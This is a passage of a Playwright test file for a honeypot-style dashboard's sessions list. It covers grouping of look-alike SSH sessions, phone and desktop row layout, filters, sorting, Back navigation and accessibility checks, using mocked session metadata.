      started_at: '2026-05-31T13:40:52+00:00',
      ended_at: '2026-05-31T13:41:50+00:00',
      auth_attempt_count: 1,
      command_count: 0,
      has_successful_login: false,
      category: 'scan',
      n_commands: 0,
      n_downloads: 0,
      n_tcpip: 0,
      auth_success: false,
      interest: 1,
      asn_org: 'OVH SAS',
      client_version: 'SSH-2.0-Go',
    })
    await mockFoldedSessions(
      page,
      ['aaaaaaaaaaa1', 'aaaaaaaaaaa2', 'aaaaaaaaaaa3', 'aaaaaaaaaaa4'].map(item),
      0,
    )
    await page.goto('/sessions')
    await dismissIntro(page)
    const rows = page.locator('tr.srow')
    await expect(rows).toHaveCount(1)
    const group = page.locator('tr.sgroup')
    await expect(group).toHaveAttribute('aria-expanded', 'false')
    await group.click()
    await expect(group).toHaveAttribute('aria-expanded', 'true')
    await expect(rows).toHaveCount(4)
    // The run shares one score, so the children repeat none of it.
    await expect(page.locator('tr.srow.nested .score-hex')).toHaveCount(0)
    // ... but each child keeps its own story badges.
    expect(await page.locator('tr.srow.nested .chips > *').count()).toBeGreaterThan(0)
  })

  test('phone: a run folds look-alikes under its leader and its members keep their own chips', async ({
    page,
  }) => {
    test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
    await mockFoldedSessions(
      page,
      ['aaaaaaaaaaa1', 'aaaaaaaaaaa2', 'aaaaaaaaaaa3', 'aaaaaaaaaaa4'].map((id) => sessionItem(id)),
      0,
    )
    await page.goto('/sessions')
    await dismissIntro(page)
    const rows = page.locator('a.row')
    await expect(rows).toHaveCount(1)
    const head = page.locator('.run-head')
    await expect(head).toHaveAttribute('aria-expanded', 'false')
    await head.click({ delay: 120 })
    await expect(head).toHaveAttribute('aria-expanded', 'true')
    await expect(rows).toHaveCount(4)
    await expect(page.locator('a.row.child .score-hex')).toHaveCount(0)
    await expect(page.getByRole('list', { name: 'Sessions like aaaaaaaa' })).toBeVisible()
    expect(await page.locator('a.row.child .chips > *').count()).toBeGreaterThan(0)
  })

  test('an expanded nested child panel respects the child indent', async ({ page }) => {
    test.skip(test.info().project.name !== 'chromium', 'desktop layout only')
    const item = (id: string) => ({
      id,
      src_port: 45214,
      dst_port: 2222,
      protocol: 'ssh',
      country: 'United States',
      country_code: 'US',
      started_at: '2026-05-31T13:40:52+00:00',
      ended_at: '2026-05-31T13:41:50+00:00',
      auth_attempt_count: 1,
      command_count: 0,
      has_successful_login: false,
      category: 'scan',
      n_commands: 0,
      n_downloads: 0,
      n_tcpip: 0,
      auth_success: false,
      interest: 1,
      asn_org: 'OVH SAS',
      client_version: 'SSH-2.0-Go',
    })
    await mockFoldedSessions(page, ['aaaaaaaaaaa1', 'aaaaaaaaaaa2', 'aaaaaaaaaaa3'].map(item), 0)
    await page.goto('/sessions')
    await dismissIntro(page)
    await page.locator('tr.sgroup').click()
    const child = page.locator('tr.srow.nested').first()
    await expect(child).toBeVisible()
    await child.click()
    await expect(child).toHaveAttribute('aria-expanded', 'true')
    const panel = page.locator('tr.expand.nested:not([hidden]) td > *').first()
    await expect(panel).toBeVisible()
    const childBox = await child.locator('.chevron').boundingBox()
    const panelBox = await panel.boundingBox()
    expect(childBox).not.toBeNull()
    expect(panelBox).not.toBeNull()
    expect(panelBox!.x).toBeGreaterThanOrEqual(childBox!.x - 1)
  })

  test.describe('phone rows show only what the sort calls for', () => {
    const rowItem = (id: string, minutes: number, interest: number) =>
      sessionItem(id, {
        ended_at: new Date(
          Date.parse('2026-05-31T13:40:52+00:00') + minutes * 60_000,
        ).toISOString(),
        command_count: 2,
        has_successful_login: true,
        category: 'active',
        n_commands: 2,
        auth_success: true,
        interest,
      })

    test.beforeEach(async ({ page }) => {
      test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
      await page.route(/\/api\/v1\/sessions\/(\?|$)/, (route) =>
        route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({
            items: [rowItem('cccccccccc01', 7, 12), rowItem('cccccccccc02', 3, 9)],
            max_interest: 20,
            meta: { page: 1, pages: 1, per_page: 25, total: 2 },
          }),
        }),
      )
    })

    test('most interesting: id, flag and city, no time or duration', async ({ page }) => {
      await page.goto('/sessions')
      await dismissIntro(page)
      const row = page.locator('a.row').first()
      await expect(row).toBeVisible()
      await expect(row.locator('.val')).toHaveCount(0)
      await expect(row.locator('.place')).toHaveText('Ashburn')
      await expect(row.getByRole('img', { name: 'United States' })).toBeVisible()
    })

    test('most recent: "ago" shown, duration not', async ({ page }) => {
      await page.goto('/sessions?sort=recent')
      await dismissIntro(page)
      const row = page.locator('a.row').first()
      await expect(row.locator('.val')).toContainText(/ago/)
      await expect(row.locator('.val')).not.toHaveText('7m')
      await expect(row.getByRole('img', { name: 'United States' })).toBeVisible()
    })

    test('duration: duration shown, "ago" not', async ({ page }) => {
      await page.goto('/sessions?sort=duration')
      await dismissIntro(page)
      const row = page.locator('a.row').first()
      await expect(row.locator('.val')).not.toContainText(/ago/)
      await expect(row.locator('.val')).toHaveText('7m')
      await expect(row.getByRole('img', { name: 'United States' })).toBeVisible()
    })

    test('by origin: the country replaces the city, with no value', async ({ page }) => {
      await page.goto('/sessions?sort=country')
      await dismissIntro(page)
      const row = page.locator('a.row').first()
      await expect(row.locator('.place')).toHaveText('United States')
      await expect(row.locator('.val')).toHaveCount(0)
    })
  })

  test.describe('phone session row and page', () => {
    const sess = (id: string) =>
      sessionItem(id, {
        started_at: new Date(Date.now() - 28 * 86_400_000).toISOString(),
        ended_at: new Date(Date.now() - 28 * 86_400_000 + 420_000).toISOString(),
        command_count: 2,
        has_successful_login: true,
        category: 'active',
        n_commands: 2,
        auth_success: true,
        interest: 12,
      })

    test.beforeEach(async ({ page }) => {
      test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
      await page.route(/\/api\/v1\/sessions\/(\?|$)/, (route) =>
        route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({
            items: [sess('dddddddddd01'), sess('dddddddddd02')],
            max_interest: 20,
            meta: { page: 1, pages: 1, per_page: 25, total: 2 },
          }),
        }),
      )
      await page.goto('/sessions?sort=recent')
      await dismissIntro(page)
    })

    test('Started is relative with the UTC time on the link, and a tap opens the full id with no inline panel', async ({
      page,
    }) => {
      const row = page.locator('a.row').first()
      await expect(row.locator('.val')).toContainText(/ago/)
      await expect(row).toHaveAttribute('title', /\d{4}-\d{2}-\d{2}.*UTC/)
      await row.click({ delay: 120 })
      await expect(page).toHaveURL(/\/sessions\/dddddddddd01$/)
      await expect(page.getByText('dddddddddd01').first()).toBeVisible()
      await expect(page.locator('tr.expand')).toHaveCount(0)
    })

    test('a row is two lines under 60px with its pieces in order', async ({ page }) => {
      const row = page.locator('a.row').first()
      const box = (await row.boundingBox())!
      expect(box.height).toBeLessThanOrEqual(60)
      const at = async (sel: string) => (await row.locator(sel).first().boundingBox())!
      const [hex, id, flag, place, chip] = [
        await at('.score-hex'),
        await at('.id'),
        await at('.flag'),
        await at('.place'),
        await at('.chip'),
      ]
      // Lead, then text; the id above the flag and place; the chips at the trailing edge.
      expect(id.x).toBeGreaterThan(hex.x + hex.width)
      expect(Math.abs(flag.x - id.x)).toBeLessThanOrEqual(1)
      expect(flag.y).toBeGreaterThan(id.y)
      expect(place.x).toBeGreaterThan(flag.x + flag.width)
      expect(chip.x).toBeGreaterThan(place.x + place.width)
      expect(chip.x + chip.width).toBeLessThanOrEqual(box.x + box.width)
    })
  })

  test('overview Sessions tile: the sub-line is centred in the tile', async ({ page }) => {
    test.skip(test.info().project.name !== 'chromium', 'desktop layout only')
    await page.goto('/')
    await dismissIntro(page)
    const tile = page.locator('.kpis .stat-tile').filter({ hasText: 'Sessions' })
    await expect(tile.locator('.meta')).toBeVisible()
    const c = await tile.evaluate((el) => {
      const range = document.createRange()
      range.selectNodeContents(el.querySelector('.meta')!)
      const m = range.getBoundingClientRect()
      const t = el.getBoundingClientRect()
      return { meta: m.left + m.width / 2, tile: t.left + t.width / 2 }
    })
    expect(Math.abs(c.meta - c.tile)).toBeLessThanOrEqual(2)
  })

  test('overview: the three stat tiles share one height; on phones the row scrolls', async ({
    page,
  }) => {
    await page.goto('/')
    await dismissIntro(page)
    const tiles = page.locator('.kpis .stat-tile')
    await expect(tiles).toHaveCount(3)
    await expect(tiles.first().locator('.value')).toBeVisible()
    const m = await tiles.evaluateAll((els) =>
      els.map((el) => {
        const cs = getComputedStyle(el)
        const range = document.createRange()
        range.selectNodeContents(el.querySelector('.value')!)
        return {
          w: el.getBoundingClientRect().width,
          h: el.getBoundingClientRect().height,
          text: range.getBoundingClientRect().width,
          pad:
            parseFloat(cs.paddingLeft) +
            parseFloat(cs.paddingRight) +
            parseFloat(cs.borderLeftWidth) +
            parseFloat(cs.borderRightWidth),
        }
      }),
    )
    if (test.info().project.name === 'mobile-chromium') {
      // Phone: swipeable row, tile widths follow their numbers, heights match.
      for (const t of m) expect(Math.abs(t.h - m[0]!.h)).toBeLessThanOrEqual(1)
      const sc = await page.locator('.kpis').evaluate((el) => ({
        cw: el.clientWidth,
        sw: el.scrollWidth,
      }))
      expect(sc.sw).toBeGreaterThanOrEqual(sc.cw)
    } else {
      for (const t of m) expect(Math.abs(t.w - m[0]!.w)).toBeLessThanOrEqual(1)
      // Desktop: no tile is wider than its content needs (largest value + padding), floored at 12rem.
      const widest = Math.max(...m.map((t) => t.text))
      for (const t of m) expect(t.w).toBeLessThanOrEqual(Math.max(widest + t.pad + 12, 192))
    }
  })

  test('overview: Logins fits on one line in its tile', async ({ page }) => {
    test.skip(test.info().project.name !== 'chromium', 'desktop layout only')
    await page.goto('/')
    await dismissIntro(page)
    const label = page
      .locator('.kpis .stat-tile')
      .filter({ hasText: 'Logins' })
      .locator('.label')
    await expect(label).toBeVisible()
    const oneLine = await label.evaluate((el) => {
      const cs = getComputedStyle(el)
      const lh = parseFloat(cs.lineHeight) || parseFloat(cs.fontSize) * 1.2
      return el.getBoundingClientRect().height <= lh * 1.5
    })
    expect(oneLine).toBe(true)
  })

  test('phone overview: the Sessions tile is centred in the scroll row on load', async ({
    page,
  }) => {
    test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
    await page.goto('/')
    await dismissIntro(page)
    const tile = page.locator('.kpis .stat-tile').filter({ hasText: 'Sessions' })
    await expect(tile).toBeVisible()
    await expect
      .poll(async () => {
        const row = await page.locator('.kpis').boundingBox()
        const t = await tile.boundingBox()
        return Math.abs(t!.x + t!.width / 2 - (row!.x + row!.width / 2))
      })
      .toBeLessThanOrEqual(2)
  })

  test.describe('folded sessions pages', () => {
    const lookAlike = (id: string) => ({
      id,
      src_port: 45214,
      dst_port: 2222,
      protocol: 'ssh',
      country: 'United States',
      country_code: 'US',
      started_at: '2026-05-31T13:40:52+00:00',
      ended_at: '2026-05-31T13:41:50+00:00',
      auth_attempt_count: 1,
      command_count: 0,
      has_successful_login: false,
      category: 'probe',
      n_commands: 0,
      n_downloads: 0,
      n_tcpip: 0,
      auth_success: false,
      interest: 1,
      asn_org: 'OVH SAS',
      client_version: 'SSH-2.0-Go',
    })
    // 40 sessions: 37 distinct rows, the last one fronting a run of 3 look-alikes.
    const page40 = Array.from({ length: 40 }, (_, i) =>
      lookAlike(`cccccccc${String(i).padStart(4, '0')}`),
    )

    test('a full page shows exactly per_page rows once its run is expanded', async ({ page }) => {
      test.skip(test.info().project.name === 'mobile-chromium', 'table layout is desktop only')
      await mockFoldedSessions(page, page40, 36)
      await page.goto('/sessions')
      await dismissIntro(page)
      const rows = page.locator('tr.srow')
      await expect(rows).toHaveCount(37)
      await page.locator('tr.sgroup').click()
      await expect(rows).toHaveCount(40)
    })

    test('expanding a run requests and lists its members', async ({ page }) => {
      test.skip(test.info().project.name === 'mobile-chromium', 'table layout is desktop only')
      await mockFoldedSessions(page, page40, 36)
      const runReq = page.waitForRequest(/\/api\/v1\/sessions\/run\?/)
      await page.goto('/sessions')
      await dismissIntro(page)
      await page.locator('tr.sgroup').click()
      const url = new URL((await runReq).url())
      expect(url.searchParams.get('offset')).toBe('37')
      expect(url.searchParams.get('count')).toBe('3')
      for (const i of [37, 38, 39])
        await expect(
          page
            .locator('tr.srow.nested')
            .filter({ hasText: `cccccccc${String(i).padStart(4, '0')}` }),
        ).toBeVisible()
    })

    test('phone: a full page shows exactly per_page rows once its run is expanded', async ({
      page,
    }) => {
      test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
      await mockFoldedSessions(page, page40, 36)
      await page.goto('/sessions')
      await dismissIntro(page)
      const rows = page.locator('a.row')
      await expect(rows).toHaveCount(37)
      await page.locator('.run-head').click({ delay: 120 })
      await expect(rows).toHaveCount(40)
    })

    test('phone: expanding a run requests and lists its members', async ({ page }) => {
      test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
      await mockFoldedSessions(page, page40, 36)
      const runReq = page.waitForRequest(/\/api\/v1\/sessions\/run\?/)
      await page.goto('/sessions')
      await dismissIntro(page)
      await page.locator('.run-head').click({ delay: 120 })
      const url = new URL((await runReq).url())
      expect(url.searchParams.get('offset')).toBe('37')
      expect(url.searchParams.get('count')).toBe('3')
      for (const i of [37, 38, 39])
        await expect(
          page.locator(`a.row.child[data-id="cccccccc${String(i).padStart(4, '0')}"]`),
        ).toBeVisible()
    })
  })

  test('phone: tapping a row opens its session, and Back returns to a list with nothing expanded', async ({
    page,
  }) => {
    test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
    await page.goto('/sessions')
    await dismissIntro(page)
    const row = page.getByRole('link', { name: /^726faaeb,/ })
    await expect(row).toBeVisible()
    for (let i = 0; i < 2; i++) {
      await row.click({ delay: 120 })
      await expect(page).toHaveURL(/\/sessions\/726faaebd6b9$/)
      await expect(page.locator('tr.expand')).toHaveCount(0)
      await page.goBack()
      await expect(page).toHaveURL(/\/sessions$/)
      await expect(row).toBeVisible()
    }
    // Two taps in the same tick must not stack a second history entry.
    await row.dblclick({ delay: 0 })
    await expect(page).toHaveURL(/\/sessions\/726faaebd6b9$/)
    await page.goBack()
    await expect(page).toHaveURL(/\/sessions$/)
  })

  test('phone: most recent puts the age on the second line beside the place', async ({ page }) => {
    test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
    await page.goto('/sessions?sort=recent')
    await dismissIntro(page)
    const row = page.locator('a.row').first()
    const val = row.locator('.val')
    await expect(val).toContainText(/ago/)
    const a = await row.locator('.place').boundingBox()
    const b = await val.boundingBox()
    const id = await row.locator('.id').boundingBox()
    expect(a).not.toBeNull()
    expect(b).not.toBeNull()
    expect(Math.abs(a!.y - b!.y)).toBeLessThanOrEqual(4)
    expect(b!.x).toBeGreaterThan(a!.x)
    expect(a!.y).toBeGreaterThan(id!.y + id!.height - 2)
  })

  test.describe('phone runs', () => {
    // One leader fronting 45 look-alikes: a second page of 5 behind "Show 5 more".
    const items = [
      sessionItem('aaaaaaaaaaa0', { n_commands: 3, interest: 9 }),
      ...Array.from({ length: 45 }, (_, i) =>
        sessionItem(`aaaaaaaaaa${String(i + 1).padStart(2, '0')}`, { n_commands: 3, interest: 9 }),
      ),
    ]
    test.beforeEach(async ({ page }) => {
      test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
      await mockFoldedSessions(page, items, 0)
      await page.route(/\/api\/v1\/sessions\/run\?/, (route) => {
        const q = new URL(route.request().url()).searchParams
        const pg = Number(q.get('page'))
        const per = Number(q.get('per_page'))
        const members = items.slice(1)
        return route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({
            items: members.slice((pg - 1) * per, pg * per),
            meta: { page: pg, per_page: per, pages: Math.ceil(members.length / per), total: 45 },
          }),
        })
      })
    })

    test('the head hangs under its leader, the members hang deeper, and ?run= follows', async ({
      page,
    }) => {
      await page.goto('/sessions')
      await dismissIntro(page)
      const head = page.locator('.run-head')
      await expect(head).toHaveAttribute('aria-expanded', 'false')
      await expect(head).toContainText('45')
      await expect(page.locator('a.row.child')).toHaveCount(0)

      const hex = (await page.locator('a.row .score-hex').first().boundingBox())!
      const leaderId = (await page.locator('a.row .id').first().boundingBox())!
      const count = (await head.locator('.cnt').boundingBox())!
      expect(count.x).toBeGreaterThan(hex.x)
      expect(count.y).toBeGreaterThan(leaderId.y)

      await head.click({ delay: 120 })
      await expect(head).toHaveAttribute('aria-expanded', 'true')
      await expect(page).toHaveURL(/[?&]run=aaaaaaaaaaa0(&|$)/)
      const kids = page.locator('a.row.child')
      await expect(kids).toHaveCount(40)
      await expect(page.locator('a.row.child .score-hex')).toHaveCount(0)
      const kidId = (await kids.first().locator('.id').boundingBox())!
      expect(kidId.x).toBeGreaterThan(leaderId.x + 4)
      expect(await kids.first().locator('.chip').count()).toBeGreaterThan(0)

      await page.getByRole('button', { name: 'Show 5 more' }).click()
      await expect(kids).toHaveCount(45)
      await expect(page.getByRole('button', { name: /^Show \d+ more/ })).toHaveCount(0)

      await page.reload()
      await expect(page.locator('.run-head')).toHaveAttribute('aria-expanded', 'true')
      await expect(page.locator('a.row.child')).toHaveCount(40)

      await page.locator('.run-head').click({ delay: 120 })
      await expect(page.locator('a.row.child')).toHaveCount(0)
      await expect(page).not.toHaveURL(/run=/)
    })

    test('tapping a run head keeps the scroll position', async ({ page }) => {
      const many = [
        ...Array.from({ length: 24 }, (_, i) =>
          sessionItem(`bbbbbbbbbb${String(i).padStart(2, '0')}`, {
            n_commands: i + 1,
            command_count: i + 1,
          }),
        ),
        ...['aaaaaaaaaaa1', 'aaaaaaaaaaa2', 'aaaaaaaaaaa3'].map((id) => sessionItem(id)),
      ]
      await mockFoldedSessions(page, many, 24, 50)
      await page.goto('/sessions')
      await dismissIntro(page)
      const head = page.locator('.run-head')
      await head.scrollIntoViewIfNeeded()
      await page.evaluate(() => window.scrollBy(0, 150))
      await page.waitForTimeout(200)
      const before = await page.evaluate(() => window.scrollY)
      expect(before).toBeGreaterThan(100)
      await head.click({ delay: 120 })
      await expect(head).toHaveAttribute('aria-expanded', 'true')
      await page.waitForTimeout(300)
      const after = await page.evaluate(() => window.scrollY)
      expect(Math.abs(after - before)).toBeLessThanOrEqual(4)
    })
  })

  test.describe('phone Back restores the list', () => {
    // 30 distinct rows, then a leader fronting a run of 45 (a second page of 5 behind "Show 5 more").
    const distinct = Array.from({ length: 30 }, (_, i) =>
      sessionItem(`bbbbbbbbbb${String(i).padStart(2, '0')}`, { n_commands: 30 - i, interest: 9 }),
    )
    const run = Array.from({ length: 46 }, (_, i) =>
      sessionItem(`aaaaaaaaaa${String(i).padStart(2, '0')}`, { n_commands: 3, interest: 9 }),
    )
    const items = [...distinct, ...run]

    test.beforeEach(async ({ page }) => {
      test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
      await mockFoldedSessions(page, items, distinct.length)
      await page.route(/\/api\/v1\/sessions\/run\?/, (route) => {
        const q = new URL(route.request().url()).searchParams
        const pg = Number(q.get('page'))
        const per = Number(q.get('per_page'))
        const members = run.slice(1)
        return route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({
            items: members.slice((pg - 1) * per, pg * per),
            meta: { page: pg, per_page: per, pages: Math.ceil(members.length / per), total: 45 },
          }),
        })
      })
    })

    // Puts the row 300px below the top of the screen, taps it, and returns the screen line it was on.
    async function tapAt(page: Page, id: string): Promise<number> {
      const row = page.locator(`a.row[data-id="${id}"]`)
      await row.scrollIntoViewIfNeeded()
      await page.evaluate((id) => {
        const top = document.querySelector(`a.row[data-id="${id}"]`)!.getBoundingClientRect().top
        window.scrollBy(0, top - 300)
      }, id)
      await page.waitForTimeout(200)
      const top = (await row.boundingBox())!.y
      await row.click({ delay: 120 })
      await expect(page).toHaveURL(new RegExp(`/sessions/${id}$`))
      return top
    }

    async function expectRestored(page: Page, id: string, top: number): Promise<void> {
      const row = page.locator(`a.row[data-id="${id}"]`)
      await expect(row).toBeFocused()
      await expect
        .poll(async () => Math.abs((await row.boundingBox())!.y - top))
        .toBeLessThanOrEqual(6)
      expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(
        true,
      )
    }

    for (const width of [390, 360]) {
      for (const how of ['browser back', 'back link'] as const) {
        test(`${width}px, ${how}: lands on the tapped row inside a run opened with Show more`, async ({
          page,
        }) => {
          await page.setViewportSize({ width, height: 780 })
          await page.goto('/sessions?sort=recent&has=commands')
          await dismissIntro(page)
          await page.locator('.run-head').click({ delay: 120 })
          await page.getByRole('button', { name: 'Show 5 more' }).click()
          const id = 'aaaaaaaaaa44'
          const top = await tapAt(page, id)
          if (how === 'browser back') await page.goBack()
          else await page.getByRole('button', { name: /All sessions/ }).click({ delay: 120 })
          await expect(page).toHaveURL(/\/sessions\?sort=recent&has=commands&run=aaaaaaaaaa00$/)
          await expect(page.locator('.run-head')).toHaveAttribute('aria-expanded', 'true')
          await expectRestored(page, id, top)
        })

        test(`${width}px, ${how}: lands on the tapped row on page 2 with a filter`, async ({
          page,
        }) => {
          await page.setViewportSize({ width, height: 780 })
          await page.goto('/sessions?page=2&has=commands')
          await dismissIntro(page)
          const id = 'bbbbbbbbbb20'
          const top = await tapAt(page, id)
          if (how === 'browser back') await page.goBack()
          else await page.getByRole('button', { name: /All sessions/ }).click({ delay: 120 })
          await expect(page).toHaveURL(/\/sessions\?page=2&has=commands$/)
          await expectRestored(page, id, top)
        })
      }
    }

    test('a cold ?run= load still finds the tapped member, and ?open= focuses its row without expanding it', async ({
      page,
    }) => {
      await page.goto('/sessions?run=aaaaaaaaaa00')
      await dismissIntro(page)
      await expect(page.locator('a.row.child')).toHaveCount(40)
      const id = 'aaaaaaaaaa20'
      const top = await tapAt(page, id)
      await page.goBack()
      await expectRestored(page, id, top)

      await page.goto('/sessions?open=bbbbbbbbbb10')
      const row = page.locator('a.row[data-id="bbbbbbbbbb10"]')
      await expect(row).toBeFocused()
      await expect(row).toBeInViewport()
      await expect(page).toHaveURL(/\/sessions$/)
      await expect(page.locator('[aria-expanded="true"]:not(.run-head)')).toHaveCount(0)
    })
  })

  test.describe('phone list layout', () => {
    // Every outcome, each as a row with counts or as a bare outcome icon.
    const mixed = [
      sessionItem('eeeeeeeeee01', {
        category: 'active',
        n_commands: 4,
        n_downloads: 1,
        interest: 40,
      }),
      sessionItem('eeeeeeeeee02', { category: 'login', auth_success: true, interest: 14 }),
      sessionItem('eeeeeeeeee03', { category: 'failed', interest: 6 }),
      sessionItem('eeeeeeeeee04', { category: 'probe', interest: 1 }),
    ]
    test.beforeEach(async ({ page }) => {
      test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
      await mockFoldedSessions(page, mixed, mixed.length)
    })

    for (const [w, h] of [
      [390, 844],
      [360, 780],
    ]) {
      test(`${w}px: two compact lines per row, no sideways scroll, icon-only outcomes, axe-clean`, async ({
        page,
      }) => {
        await page.setViewportSize({ width: w!, height: h! })
        await page.goto('/sessions')
        await dismissIntro(page)
        const rows = page.locator('a.row')
        await expect(rows).toHaveCount(4)
        expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(
          w!,
        )
        for (const row of await rows.all()) {
          const box = (await row.boundingBox())!
          expect(box.height).toBeGreaterThanOrEqual(52)
          expect(box.height).toBeLessThanOrEqual(60)
          const id = (await row.locator('.id').boundingBox())!
          const meta = (await row.locator('.l2').boundingBox())!
          expect(meta.y).toBeGreaterThanOrEqual(id.y + id.height - 2)
          expect(await row.locator('.id').innerText()).toHaveLength(8)
        }
        // No outcome word sits beside an outcome icon; the words are the chip's name.
        const bare = page.locator('a.row .chip.only')
        await expect(bare).toHaveCount(3)
        for (const chip of await bare.all()) {
          expect(await chip.innerText()).toBe('')
          await expect(chip).toHaveAttribute('role', 'img')
          expect(await chip.getAttribute('aria-label')).toMatch(/\w{4}/)
          expect(await chip.getAttribute('title')).toBeTruthy()
        }
        for (const chip of await page.locator('a.row .chip').all())
          expect(await chip.getAttribute('aria-label')).toBeTruthy()
        await expectAxeClean(page)
      })
    }

    test('the header names the sort in a short clause', async ({ page }) => {
      await page.goto('/sessions')
      await dismissIntro(page)
      await expect(page.locator('.sub')).toContainText('most interesting first')
      await page.goto('/sessions?sort=recent')
      await expect(page.locator('.sub')).toContainText('newest first')
    })

    test('crossing 760px swaps in the table and keeps the filters', async ({ page }) => {
      await page.goto('/sessions?sort=recent')
      await dismissIntro(page)
      await expect(page.locator('ul.sessions-phone')).toBeVisible()
      await page.setViewportSize({ width: 900, height: 800 })
      await expect(page.locator('tr.srow')).toHaveCount(4)
      await expect(page.locator('ul.sessions-phone')).toHaveCount(0)
      await expect(page).toHaveURL(/sort=recent/)
      await page.setViewportSize({ width: 390, height: 844 })
      await expect(page.locator('ul.sessions-phone')).toBeVisible()
    })
  })

  test('the downloads chip on a session links to its payload', async ({ page }) => {
    await page.goto('/sessions/726faaebd6b9')
    await dismissIntro(page)
    const chip = page.locator('a.dl-chip')
    await expect(chip).toBeVisible()
    await expect(chip).toHaveAttribute(
      'href',
      '/payloads#spec-8da193366e1554c08b2870c50f737b9587c3372b656151c4a96028af26f51334',
    )
  })

  test('sessions filters and sort drive the URL, axe-clean', async ({ page }) => {
    test.skip(test.info().project.name === 'mobile-chromium', 'phone uses the bottom sheet')
    await page.goto('/sessions')
    await dismissIntro(page)
    await expect(page.getByRole('heading', { level: 1, name: 'Sessions' })).toBeVisible()

    // Story badges are a count plus an icon, so the visible text is just a
    // number; assert the accessible name that carries the meaning.
    await expect(page.getByLabel(/command(s)? typed/).first()).toBeVisible()

    // Outcome is a popover of checkboxes behind an "Outcome" trigger, not a
    // row of buttons: open it, then tick the box.
    await page.getByRole('button', { name: 'Outcome' }).click()
    // Delay the click to trigger the focus shift that closes the panel before the label's default action.
    await page.getByText('Got control').click({ delay: 120 })
    await expect(page.getByRole('checkbox', { name: 'Got control' })).toBeChecked()
    // ...and the panel stays open so more than one outcome can be picked.
    await expect(page.getByRole('checkbox', { name: 'Ran commands' })).toBeVisible()
    await expect(page).toHaveURL(/has=success/)
    // The panel stays open for multi-select; on a phone it covers the controls
    // below, so close it the way a user would before moving on.
    await page.keyboard.press('Escape')

    await page.getByRole('button', { name: 'Most interesting' }).click()
    await page.getByRole('option', { name: 'Most recent' }).click()
    await expect(page).toHaveURL(/sort=recent/)

    // Shown at every width: on a phone it sits on its own full-width row, so a
    // country filter can be started there and not only removed.
    await page.getByRole('button', { name: 'All countries' }).click()
    await page.getByRole('option', { name: 'United States' }).click()
    await expect(page).toHaveURL(/country=US/)

    // Reloading with these params in the URL restores the same filter state (URL is state).
    await page.reload()
    await expect(page.getByRole('button', { name: 'Outcome: Got control' })).toBeVisible()
    await page.getByRole('button', { name: 'Outcome: Got control' }).click()
    await expect(page.getByRole('checkbox', { name: 'Got control' })).toBeChecked()

    await expectAxeClean(page)
  })

  test('phone filters open a bottom sheet and drive the URL, axe-clean', async ({ page }) => {
    test.skip(test.info().project.name !== 'mobile-chromium', 'phone layout only')
    await page.setViewportSize({ width: 360, height: 780 })
    await page.goto('/sessions')
    await dismissIntro(page)
    const dialog = page.getByRole('dialog')

    const pills = page.locator('button.pc-pill')
    for (const i of [0, 1, 2]) {
      const box = (await pills.nth(i).boundingBox())!
      expect(box.height).toBeGreaterThanOrEqual(44)
      expect(box.x + box.width).toBeLessThanOrEqual(360)
      expect(
        await pills
          .nth(i)
          .locator('.pc-text')
          .evaluate((e) => e.scrollWidth <= e.clientWidth),
      ).toBe(true)
    }
    expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(360)

    // The sans stack is the system font, so widths differ per platform (CI runners render wider
    // than a dev machine): simulate a wider face and expect no clipping or sideways scroll.
    await page.addStyleTag({ content: '.pc-pill { letter-spacing: 1px !important }' })
    for (const i of [0, 1, 2]) {
      expect(
        await pills
          .nth(i)
          .locator('.pc-text')
          .evaluate((e) => e.scrollWidth <= e.clientWidth),
      ).toBe(true)
    }
    expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(360)

    await page.getByRole('button', { name: 'Outcome: Outcome' }).click({ delay: 120 })
    await expect(dialog).toBeVisible()
    await page.getByRole('checkbox', { name: /Got control/ }).click({ delay: 120 })
    await expect(page.getByRole('checkbox', { name: /Got control/ })).toBeChecked()
    // Multi-select: the sheet stays open until Done.
    await expect(page.getByRole('checkbox', { name: /Ran commands/ })).toBeVisible()
    await expect(page).toHaveURL(/has=success/)
    await page.getByRole('button', { name: 'Done' }).click({ delay: 120 })
    await expect(dialog).toHaveCount(0)
    await expect(page.getByRole('button', { name: 'Outcome: Got control' })).toBeFocused()

    await page.getByRole('button', { name: 'Sort: Most interesting' }).click({ delay: 120 })
    const sheetBox = (await dialog.boundingBox())!
    expect(sheetBox.x).toBeGreaterThanOrEqual(0)
    expect(sheetBox.x + sheetBox.width).toBeLessThanOrEqual(360)
    await page.getByRole('radio', { name: /Most recent/ }).click({ delay: 120 })
    await expect(page).toHaveURL(/sort=recent/)
    await expect(dialog).toHaveCount(0)

    await page.getByRole('button', { name: 'Country: all' }).click({ delay: 120 })
    await page.keyboard.press('Escape')
    await expect(dialog).toHaveCount(0)
    await expect(page.getByRole('button', { name: 'Country: all' })).toBeFocused()
    await page.getByRole('button', { name: 'Country: all' }).click({ delay: 120 })
    await page.getByRole('radio', { name: /United States/ }).click({ delay: 120 })
    await expect(page).toHaveURL(/country=US/)

    await page.reload()
    await expect(page.getByRole('button', { name: 'Outcome: Got control' })).toBeVisible()
    await expect(page.getByRole('button', { name: 'Country: United States' })).toBeVisible()

    await expectAxeClean(page)
    await page.getByRole('button', { name: 'Sort: Most recent' }).click({ delay: 120 })
    // Axe reads colours, so let the sheet finish fading in first.
    await page.waitForFunction(
      () => getComputedStyle(document.querySelector('.pc-root')!).opacity === '1',
    )
    await expectAxeClean(page)
  })

